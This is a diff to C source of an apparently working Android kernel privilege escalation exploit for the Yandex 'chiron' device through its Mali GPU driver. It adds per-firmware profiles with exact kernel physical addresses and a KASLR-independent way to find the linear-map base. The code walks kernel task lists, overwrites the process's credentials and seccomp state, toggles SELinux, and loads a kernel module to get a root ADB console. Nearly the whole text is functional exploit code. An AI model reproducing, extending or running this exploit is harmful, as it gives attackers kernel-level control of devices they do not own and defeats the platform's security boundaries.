@@ -13,6 +13,7 @@
  * Everything is reported through a text buffer for logcat.
  */
 #define _GNU_SOURCE
+#define _FILE_OFFSET_BITS 64
 #include <errno.h>
 #include <fcntl.h>
 #include <poll.h>
@@ -29,6 +30,8 @@
 #include <signal.h>
 #include <stdlib.h>
 #include <sys/prctl.h>
+#include <sys/utsname.h>
+#include <sys/system_properties.h>
 #include <sys/syscall.h>
 #include <unistd.h>
 #include <android/log.h>
@@ -47,6 +50,8 @@ typedef u32 base_mem_alloc_flags;
 #include "adb_uapi.h"
 #include "process_console.h"
 #include "aio_cleanup.h"
+
+const char *mali_jm_probe(void);
 
 #define BASE_MEM_IMPORT_TYPE_USER_BUFFER 3
 struct base_mem_import_user_buffer { u64 ptr; u64 length; };
@@ -84,14 +89,83 @@ struct base_external_resource { u64 ext_resource; };
 #define T_SECCOMP_MODE   0x770UL
 #define T_SECCOMP_FILTER 0x778UL
 
-/* init_task lives at a fixed physical address on this SoC; these two values
- * come from the proven helper (rootsh.c.tpl) and must not be "tidied".
- * INIT_TASKS_PREV_OFF is a RAW offset inside INIT_PAGE_PA: it lands on
- * init_task.tasks.prev, which is what the lbase magic is calibrated against. */
-#define INIT_PAGE_PA   0x22f7000ULL
-#define INIT_LBASE_RAW  0x918ULL  /* init_task.tasks.next (lbase magic) */
-#define INIT_WALK_RAW   0x920ULL  /* init_task.tasks.prev (walk start)  */
-#define LBASE_MAGIC    0x56110418ULL
+/* Per-firmware kernel profile.  Every address here is exact for one build:
+ * the boot chain has no approximate match, and a wrong profile only reads. */
+struct chiroru_vendor_sym { const char *name; uint64_t off; };
+
+struct chiroru_profile {
+  const char *id;
+  /* Exact identity gate; NULL disables the native check (the app catalog
+   * already selected this profile, but defense in depth is cheap). */
+  const char *fingerprint;
+  const char *incremental;
+  const char *kernel_release;
+  uint64_t image_pa;          /* physical start of the arm64 Image        */
+  uint64_t init_task_pa;      /* physical address of init_task           */
+  /* Legacy profiles derive the linear-map base from init_task.tasks.next
+   * minus a calibrated physical offset.  Newer profiles read the kernel's
+   * own memstart_addr/vabits_actual, which survives any KASLR placement. */
+  int use_magic_lbase;
+  uint64_t lbase_magic;
+  uint64_t memstart_addr_pa;
+  uint64_t vabits_actual_pa;
+  uint64_t kimage_voffset_pa;
+  int modules_supported;
+  int direct_adb;             /* load the ADB .ko with init_module, no ksud */
+  int vendor_count;
+  const struct chiroru_vendor_sym *vendor;
+};
+
+static const struct chiroru_vendor_sym vendor_syms_5000001307[] = {
+    {"selinux_state", 0x147CB10ULL},
+    {"selinux_blob_sizes", 0xFE2784ULL},
+    {"sys_call_table", 0xEEE6E8ULL},
+    {"init_mm", 0x12BE860ULL},
+};
+
+/* 5000001307 (Android 11, 5.4.125-ab5000001307).  Unchanged proven path. */
+static const struct chiroru_profile profile_5000001307 = {
+    .id = "chiron-5000001307",
+    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/5000001307:user/dev-keys",
+    .incremental = "5000001307",
+    .kernel_release = "5.4.125-android11-2-g601513d4b115-ab5000001307",
+    .image_pa = 0x1080000ULL,
+    .init_task_pa = 0x22f7500ULL,   /* page 0x22f7000, tasks.next at 0x918 */
+    .use_magic_lbase = 1,
+    .lbase_magic = 0x56110418ULL,
+    .modules_supported = 1,
+    .vendor_count = 4,
+    .vendor = vendor_syms_5000001307,
+};
+
+static const struct chiroru_vendor_sym vendor_syms_1982735225[] = {
+    {"selinux_state", 0x147CB10ULL},
+    {"selinux_blob_sizes", 0xFE253CULL},
+};
+
+/* 1982735225 (factory, Android 11, 5.4.125-ab1982735225, 32-bit userspace).
+ * Symbol addresses were recovered from the verified factory image:
+ *   init_task           image+0x1277480 -> PA 0x22f7480
+ *   memstart_addr       image+0x0fe20c8 -> PA 0x20620c8
+ *   vabits_actual       image+0x1017b20 -> PA 0x2097b20
+ *   kimage_voffset      image+0x0fe20d8 -> PA 0x20620d8
+ * lbase = PAGE_OFFSET - memstart_addr, so it is valid for every boot. */
+static const struct chiroru_profile profile_1982735225 = {
+    .id = "chiron-1982735225",
+    .fingerprint = "Yandex/chiron/chiron:11/RQ3A.210805.001.A1/1982735225:user/dev-keys",
+    .incremental = "1982735225",
+    .kernel_release = "5.4.125-android11-2-g85fe5498964f-ab1982735225",
+    .image_pa = 0x1080000ULL,
+    .init_task_pa = 0x22f7480ULL,   /* page 0x22f7000, tasks.next at 0x898 */
+    .use_magic_lbase = 0,
+    .memstart_addr_pa = 0x20620c8ULL,
+    .vabits_actual_pa = 0x2097b20ULL,
+    .kimage_voffset_pa = 0x20620d8ULL,
+    .modules_supported = 0,         /* KernelSU is not built for this kernel */
+    .direct_adb = 1,                /* 32-bit userspace has no 64-bit ksud */
+    .vendor_count = 2,
+    .vendor = vendor_syms_1982735225,
+};
 #define WALK_SUB       T_TASKS      /* va -> task_struct                    */
 #define WALK_PREV_OFF  T_TASKS_PREV /* where the walk reads the next va     */
 
@@ -171,7 +245,14 @@ static int alloc_page(int fd, void **cpu, u64 *gpu) {
   if (p == MAP_FAILED) return -1;
   *(volatile u64 *)p = 0;
   *cpu = p;
+  /* A 32-bit process gets GPU VAs above 4 GB, so the CPU address of the
+   * mmap is not a valid GPU address there; the driver cookie is.  A 64-bit
+   * process's user address is the GPU address. */
+#if defined(__arm__)
+  *gpu = cookie;
+#else
   *gpu = (u64)(uintptr_t)p;
+#endif
   return 0;
 }
 
@@ -254,14 +335,11 @@ static uint64_t kallsyms_stext(void) {
  * Offsets from _stext, recovered from chiron-vmlinux.elf (see
  * tools/patch-ko.py, which does the same on the host). Addresses depend on the
  * KASLR slide, so they must be written for the *current* boot. */
-#define VENDOR_SYM_COUNT 4
-static int patch_vendor_syms(void *buf, size_t len, uint64_t stext, int count, struct rpt *r) {
-  static const struct { const char *name; uint64_t off; } want[VENDOR_SYM_COUNT] = {
-      {"selinux_state", 0x147CB10ULL},
-      {"selinux_blob_sizes", 0xFE2784ULL},
-      {"sys_call_table", 0xEEE6E8ULL},
-      {"init_mm", 0x12BE860ULL},
-  };
+static int patch_vendor_syms(void *buf, size_t len, uint64_t stext,
+                             const struct chiroru_profile *prof, int count,
+                             struct rpt *r) {
+  const struct chiroru_vendor_sym *want = prof->vendor;
+  int want_count = prof->vendor_count;
   Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
   Elf64_Shdr *sh;
   const char *strtab;
@@ -282,8 +360,8 @@ static int patch_vendor_syms(void *buf, size_t len, uint64_t stext, int count, s
     const char *nm;
     if (syms[i].st_name == 0) continue;
     nm = strtab + syms[i].st_name;
-      for (j = 0; j < count; j++) {
-      if (strcmp(nm, want[j].name)) continue;
+      for (j = 0; j < count && j < want_count; j++) {
+      if (!want || strcmp(nm, want[j].name)) continue;
       syms[i].st_shndx = SHN_ABS;
       syms[i].st_value = stext + want[j].off;
       done++;
@@ -549,7 +627,8 @@ static int ksu_loaded(void) {
 /* Explicit ADB mode, with an independent module and no KSU lifecycle. */
 static char adb_console_params[256];
 static int load_adb_module(void *kbuf, size_t ksize, const char *ko_path,
-                           const char *loader, struct rpt *r) {
+                           const char *loader, const struct chiroru_profile *prof,
+                           struct rpt *r) {
   char patched[512], source[512];
   char temporary[] = "/data/local/tmp/.chiroru-su-XXXXXX";
   uint64_t stext = 0;
@@ -568,14 +647,30 @@ static int load_adb_module(void *kbuf, size_t ksize, const char *ko_path,
   if (restore_kptr && (lseek(sysctl, 0, SEEK_SET) < 0 || write(sysctl, "0", 1) != 1)) goto done;
   stext = kallsyms_stext();
   rp(r, "adb_root: _stext=0x%llx\n", (unsigned long long)stext);
-  if (!stext || !loader || !ko_path ||
-      patch_vendor_syms(kbuf, ksize, stext, 2, r)) goto done;
-  if (snprintf(patched, sizeof patched, "%s.patched", ko_path) >= (int)sizeof patched ||
-      snprintf(source, sizeof source, "%s.client", ko_path) >= (int)sizeof source) goto done;
-  out = open(patched, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
-  if (out < 0 || write(out, kbuf, ksize) != (ssize_t)ksize) goto done;
-  close(out); out = -1;
-  if (run_ksud(loader, patched, adb_console_params, r)) goto done;
+  if (!stext || !ko_path ||
+      patch_vendor_syms(kbuf, ksize, stext, prof, prof->vendor_count, r)) goto done;
+  if (snprintf(source, sizeof source, "%s.client", ko_path) >= (int)sizeof source) goto done;
+  if (prof->direct_adb) {
+    /* The factory userspace is 32-bit and has no linker64, so the bundled
+     * aarch64 ksud cannot run. Resolve the module's text symbols here and call
+     * init_module directly; the kernel resolves exported data symbols. */
+    if (patch_module_symbols(kbuf, ksize, r)) goto done;
+    errno = 0;
+    if (syscall(__NR_init_module, kbuf, (unsigned long)ksize, "") != 0) {
+      if (errno != EEXIST) {
+        rp(r, "adb_root: init_module errno=%d (%s)\n", errno, strerror(errno));
+        goto done;
+      }
+      rp(r, "adb_root: module already loaded\n");
+    }
+  } else {
+    if (!loader) goto done;
+    if (snprintf(patched, sizeof patched, "%s.patched", ko_path) >= (int)sizeof patched) goto done;
+    out = open(patched, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
+    if (out < 0 || write(out, kbuf, ksize) != (ssize_t)ksize) goto done;
+    close(out); out = -1;
+    if (run_ksud(loader, patched, adb_console_params, r)) goto done;
+  }
   /* devtmpfs/ueventd creates the node asynchronously. Keep this bounded. */
   for (int i = 0; i < 100; ++i) {
     node = open(CHIRORU_ADB_DEVICE, O_RDONLY | O_NOFOLLOW | O_CLOEXEC);
@@ -621,8 +716,10 @@ done:
 }
 
 static int load_module(void *kbuf, size_t ksize, const char *ko_path,
-                        const char *ksud_path, int run_hooks, struct rpt *r) {
-  if (run_hooks == -1) return load_adb_module(kbuf, ksize, ko_path, ksud_path, r);
+                        const char *ksud_path, int run_hooks,
+                        const struct chiroru_profile *prof, uint64_t stext_hint,
+                        struct rpt *r) {
+  if (run_hooks == -1) return load_adb_module(kbuf, ksize, ko_path, ksud_path, prof, r);
   uint64_t phys = 0;
   char params[128];
 
@@ -647,10 +744,11 @@ static int load_module(void *kbuf, size_t ksize, const char *ko_path,
 
   if (ksud_path && ksud_path[0] && ko_path && access(ksud_path, X_OK) == 0) {
     char patched[256];
-    uint64_t stext = kallsyms_stext();
+    uint64_t stext = stext_hint ? stext_hint : kallsyms_stext();
     int fd;
     rp(r, "module: _stext=0x%llx\n", (unsigned long long)stext);
-    if (stext) patch_vendor_syms((void *)kbuf, ksize, stext, VENDOR_SYM_COUNT, r);
+    if (stext) patch_vendor_syms((void *)kbuf, ksize, stext, prof,
+                                 prof->vendor_count, r);
     snprintf(patched, sizeof patched, "%s.patched", ko_path);
     fd = open(patched, O_WRONLY | O_CREAT | O_TRUNC, 0600);
     if (fd < 0) { rp(r, "module: create %s errno=%d\n", patched, errno); return -1; }
@@ -723,7 +821,8 @@ static int load_module(void *kbuf, size_t ksize, const char *ko_path,
  * plus the optional module load. Returns 0 on success, negative otherwise.
  * The reclaim step is a race, so this is called in a loop by mali36449_root().
  */
-static int attempt_once(const void *kbuf, size_t ksize, int kfd,
+static int attempt_once(const struct chiroru_profile *prof,
+                        const void *kbuf, size_t ksize, int kfd,
                         const char *ko_path, const char *ksud_path,
                         int run_hooks, struct rpt *r, int *stage) {
   int fd = -1, ret = -1, found = 0, found_block = -1, i;
@@ -740,7 +839,10 @@ static int attempt_once(const void *kbuf, size_t ksize, int kfd,
   u64 event_gpu = 0, imp_gpu = 0, cookie = 0, commit = ~0ULL;
   uint64_t entries[RS_ENTRIES];
   struct rs_result rs;
-  uint64_t lbase = 0, table0 = 0;
+  uint64_t lbase = 0, table0 = 0, stext_va = 0;
+  uint64_t init_page_pa = prof->init_task_pa & ~0xfffULL;
+  uint64_t init_lbase_raw = (prof->init_task_pa & 0xfffULL) + T_TASKS;
+  uint64_t init_walk_raw = (prof->init_task_pa & 0xfffULL) + T_TASKS_PREV;
   volatile uint64_t *table = NULL;
 
   memset(&mi, 0, sizeof mi);
@@ -833,7 +935,11 @@ static int attempt_once(const void *kbuf, size_t ksize, int kfd,
              (off_t)cookie);
   rp(r, "mmap import -> %p errno=%d\n", imp, imp == MAP_FAILED ? errno : 0);
   if (imp == MAP_FAILED) { rp(r, "FAIL mmap import errno=%d\n", errno); goto out; }
+#if defined(__arm__)
+  imp_gpu = cookie;
+#else
   imp_gpu = (u64)(uintptr_t)imp;
+#endif
   if (query(fd, imp_gpu, &commit)) { rp(r, "FAIL MEM_QUERY\n"); goto out; }
   rp(r, "import gpu_va=0x%llx commit=%llu\n", (unsigned long long)imp_gpu,
      (unsigned long long)commit);
@@ -916,29 +1022,63 @@ static int attempt_once(const void *kbuf, size_t ksize, int kfd,
         (volatile uint8_t *)((char *)spray_base +
                              (size_t)found_block * BLOCK_BYTES);
 
-    /* lbase: init_task.tasks.next - magic. init_task sits at a fixed PA. */
-    {
-      volatile uint8_t *p = win_open(table, 3, table0, INIT_PAGE_PA, slot0);
+    if (prof->use_magic_lbase) {
+      /* Legacy profile: init_task.tasks.next minus a calibrated physical
+       * offset.  The offset is only valid for this exact build. */
+      volatile uint8_t *p = win_open(table, 3, table0, init_page_pa, slot0);
       uint64_t next = 0;
       if (!p) { rp(r, "FAIL no free entry for lbase\n"); goto out; }
-      memcpy(&next, (const void *)(p + INIT_LBASE_RAW), 8);
+      memcpy(&next, (const void *)(p + init_lbase_raw), 8);
       win_close(table, 3);
       if (next < 0xffffff8000000000ULL) {
         rp(r, "FAIL init_task.next=0x%llx\n", (unsigned long long)next);
         goto out;
       }
-      lbase = next - LBASE_MAGIC;
-      rp(r, "lbase=0x%llx\n", (unsigned long long)lbase);
+      lbase = next - prof->lbase_magic;
+      rp(r, "lbase=0x%llx (magic)\n", (unsigned long long)lbase);
+    } else {
+      /* KASLR-independent: read the kernel's own memstart_addr and
+       * vabits_actual.  __phys_to_virt(x) = x - physvirt_offset and
+       * physvirt_offset = memstart_addr - PAGE_OFFSET, so the linear-map
+       * base is PAGE_OFFSET - memstart_addr. */
+      const uint64_t pas[3] = {prof->memstart_addr_pa,
+                               prof->vabits_actual_pa,
+                               prof->kimage_voffset_pa};
+      uint64_t vals[3] = {0, 0, 0};
+      uint64_t page_off;
+      for (int q = 0; q < 3; q++) {
+        uint64_t pa = pas[q];
+        volatile uint8_t *p = win_open(table, 3 + q, table0,
+                                       pa & ~0xfffULL, slot0);
+        if (!p) { rp(r, "FAIL no entry for kernel base\n"); goto out; }
+        memcpy(&vals[q], (const void *)(p + (pa & 0xfffULL)), 8);
+        win_close(table, 3 + q);
+      }
+      if (vals[1] < 32 || vals[1] > 52) {
+        rp(r, "FAIL vabits_actual=%llu\n", (unsigned long long)vals[1]);
+        goto out;
+      }
+      page_off = (uint64_t)(0ULL - (1ULL << vals[1]));
+      lbase = page_off - vals[0];
+      if ((lbase & 0xfffULL) || lbase < 0xffffff8000000000ULL) {
+        rp(r, "FAIL implausible linear base=0x%llx (memstart=0x%llx)\n",
+           (unsigned long long)lbase, (unsigned long long)vals[0]);
+        goto out;
+      }
+      stext_va = vals[2] + prof->image_pa + 0x800ULL;
+      rp(r, "lbase=0x%llx memstart=0x%llx vabits=%llu _stext=0x%llx\n",
+         (unsigned long long)lbase, (unsigned long long)vals[0],
+         (unsigned long long)vals[1], (unsigned long long)stext_va);
     }
 
     /* Walk the task list to our own task_struct. */
     {
-      int k = 4, n;
+      int k = prof->use_magic_lbase ? 4 : 6, n;
       uint64_t va;
       uint64_t cur_cred = 0, cur_task_pa = 0;
-      volatile uint8_t *p = win_open(table, k, table0, INIT_PAGE_PA, slot0);
+      volatile uint8_t *p = win_open(table, k, table0, init_page_pa, slot0);
       if (!p) { rp(r, "FAIL no entry for walk\n"); goto out; }
-      memcpy(&va, (const void *)(p + INIT_WALK_RAW), 8);
+      memcpy(&va, (const void *)(p + init_walk_raw), 8);
       win_close(table, k);
       k++;
 
@@ -986,6 +1126,14 @@ static int attempt_once(const void *kbuf, size_t ksize, int kfd,
         va = prev;
       }
       if (!cur_cred) { rp(r, "FAIL own task not found\n"); goto out; }
+#ifdef CHIRORU_READ_ONLY
+      /* Development aid: prove the profile's read path (reclaim, linear-map
+       * base, task walk) without patching credentials. Release builds never
+       * define this. */
+      rp(r, "read-only build: task found, stopping before any write\n");
+      ret = 0;
+      goto out;
+#endif
 
       /* From here on the kernel state is modified: no retry allowed. */
       *stage = 1;
@@ -1092,7 +1240,8 @@ static int attempt_once(const void *kbuf, size_t ksize, int kfd,
         ret = -2;
         goto out;
       }
-      ret = (kbuf ? load_module((void *)kbuf, ksize, ko_path, ksud_path, run_hooks, r)
+      ret = (kbuf ? load_module((void *)kbuf, ksize, ko_path, ksud_path,
+                                run_hooks, prof, stext_va, r)
                   : process_console_bootstrap()) == 0 ? 0 : -2;
       sp = win_open(table, SELINUX_RESTORE_WINDOW_SLOT, table0, SELINUX_PA, (volatile uint8_t *)
                     ((char *)spray_base + (size_t)found_block * BLOCK_BYTES));
@@ -1144,8 +1293,9 @@ out:
  * So the loop below only repeats stage-0 failures, and the cred/seccomp/module
  * stage runs at most once.
  */
-int chiron_5000001307_root(const char *ko_path, const char *ksud_path,
-                         int run_hooks, struct rpt *r) {
+static int chiroru_root_with(const struct chiroru_profile *prof,
+                             const char *ko_path, const char *ksud_path,
+                             int run_hooks, struct rpt *r) {
   const int max_tries = 24;
   int i, stage = 0, rc = -1;
   const void *kbuf = NULL;
@@ -1175,7 +1325,7 @@ int chiron_5000001307_root(const char *ko_path, const char *ksud_path,
   }
 
   for (i = 1; i <= max_tries; i++) {
-    rc = attempt_once(kbuf, ksize, kfd, ko_path, ksud_path, run_hooks, r, &stage);
+    rc = attempt_once(prof, kbuf, ksize, kfd, ko_path, ksud_path, run_hooks, r, &stage);
     if (rc == 0) {
       if (i > 1) rp(r, "==== ok on attempt %d/%d ====\n", i, max_tries);
       if (kmap != MAP_FAILED) munmap(kmap, ksize);
@@ -1202,10 +1352,63 @@ int chiron_5000001307_root(const char *ko_path, const char *ksud_path,
   return -1;
 }
 
-int chiron_5000001307_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
-  (void)hooks;
-  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
-  /* Capture the actual app identity before the bootstrap changes credentials. */
+/* Exact identity gate for profiles that carry one.  Reads only properties and
+ * uname; it never touches the kernel. */
+static int profile_gate(const struct chiroru_profile *prof, struct rpt *r) {
+  char fp[192] = {0}, inc[96] = {0};
+  struct utsname u;
+
+  if (!prof->fingerprint) return 0;
+  __system_property_get("ro.build.fingerprint", fp);
+  __system_property_get("ro.build.version.incremental", inc);
+  if (uname(&u) != 0) { rp(r, "preflight: blocked (uname failed)\n"); return -1; }
+  if (strcmp(fp, prof->fingerprint) || strcmp(inc, prof->incremental) ||
+      strcmp(u.release, prof->kernel_release)) {
+    rp(r, "preflight: blocked (firmware mismatch)\n"
+          "  have: %s / %s / %s\n  need: %s / %s / %s\n",
+       fp, inc, u.release, prof->fingerprint, prof->incremental,
+       prof->kernel_release);
+    return -1;
+  }
+  return 0;
+}
+
+int chiron_5000001307_root(const char *ko_path, const char *ksud_path,
+                           int run_hooks, struct rpt *r) {
+  return chiroru_root_with(&profile_5000001307, ko_path, ksud_path, run_hooks, r);
+}
+
+int chiron_1982735225_root(const char *ko_path, const char *ksud_path,
+                           int run_hooks, struct rpt *r) {
+  if (profile_gate(&profile_1982735225, r) != 0) return -1;
+  if (ko_path && !profile_1982735225.modules_supported) {
+    rp(r, "factory: kernel module bootstrap is not built for this kernel yet\n");
+    return -2;
+  }
+  return chiroru_root_with(&profile_1982735225, ko_path, ksud_path, run_hooks, r);
+}
+
+const char *chiron_1982735225_probe(void) {
+  static char out[6144];
+  char fp[192] = {0}, inc[96] = {0};
+  struct utsname u;
+  int gate;
+
+  __system_property_get("ro.build.fingerprint", fp);
+  __system_property_get("ro.build.version.incremental", inc);
+  if (uname(&u) != 0) { u.release[0] = 0; u.machine[0] = 0; }
+  gate = !strcmp(fp, profile_1982735225.fingerprint) &&
+         !strcmp(inc, profile_1982735225.incremental) &&
+         !strcmp(u.release, profile_1982735225.kernel_release);
+  snprintf(out, sizeof out,
+           "factory profile: %s\n"
+           "fingerprint=%s\nincremental=%s\nkernel=%s machine=%s\n%s",
+           gate ? "exact match" : "MISMATCH — no operation will run",
+           fp, inc, u.release, u.machine, mali_jm_probe());
+  return out;
+}
+
+static int adb_app_identity(struct rpt *r) {
   char context[160] = {0};
   uid_t uid = getuid();
   int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
@@ -1213,11 +1416,39 @@ int chiron_5000001307_adb_root(const char *ko, const char *loader, int hooks, st
   if (fd >= 0) close(fd);
   if (n <= 0 || uid < 10000 || uid > 19999 ||
       strncmp(context, "u:r:untrusted_app:s0:c", sizeof("u:r:untrusted_app:s0:c") - 1)) {
-    rp(r, "preflight: blocked (cannot enroll console identity)\n"); return -1;
+    rp(r, "preflight: blocked (cannot enroll console identity)\n");
+    return -1;
   }
   context[strcspn(context, "\n")] = 0;
-  if (strspn(context, "abcdefghijklmnopqrstuvwxyz0123456789_:,") != strlen(context) ||
-      snprintf(adb_console_params, sizeof adb_console_params,
-               "console_uid=%u console_context=%s", uid, context) >= (int)sizeof adb_console_params) return -1;
-  return chiron_5000001307_root(ko, loader, -1, r);
+  if (strspn(context, "abcdefghijklmnopqrstuvwxyz0123456789_:,") != strlen(context)) return -1;
+  return uid;
+}
+
+int chiron_5000001307_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
+  (void)hooks;
+  if (!ko || !loader) { rp(r, "preflight: blocked (ADB module and loader required)\n"); return -1; }
+  /* Capture the actual app identity before the bootstrap changes credentials. */
+  char context[160] = {0};
+  int uid = adb_app_identity(r);
+  if (uid < 0) return -1;
+  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
+  ssize_t n = fd < 0 ? -1 : read(fd, context, sizeof context - 1);
+  if (fd >= 0) close(fd);
+  if (n <= 0) return -1;
+  context[strcspn(context, "\n")] = 0;
+  if (snprintf(adb_console_params, sizeof adb_console_params,
+               "console_uid=%u console_context=%s", (unsigned)uid, context) >= (int)sizeof adb_console_params) return -1;
+  return chiroru_root_with(&profile_5000001307, ko, loader, -1, r);
+}
+
+int chiron_1982735225_adb_root(const char *ko, const char *loader, int hooks, struct rpt *r) {
+  (void)hooks;
+  if (!ko) { rp(r, "preflight: blocked (ADB module required)\n"); return -1; }
+  if (profile_gate(&profile_1982735225, r) != 0) return -1;
+  if (adb_app_identity(r) < 0) return -1;
+  /* The factory ADB module is loaded in ADB-only mode: the in-app root console
+   * is already provided by the credential path, and direct init_module has no
+   * way to pass enrollment parameters. */
+  adb_console_params[0] = 0;
+  return chiroru_root_with(&profile_1982735225, ko, loader, -1, r);
 }
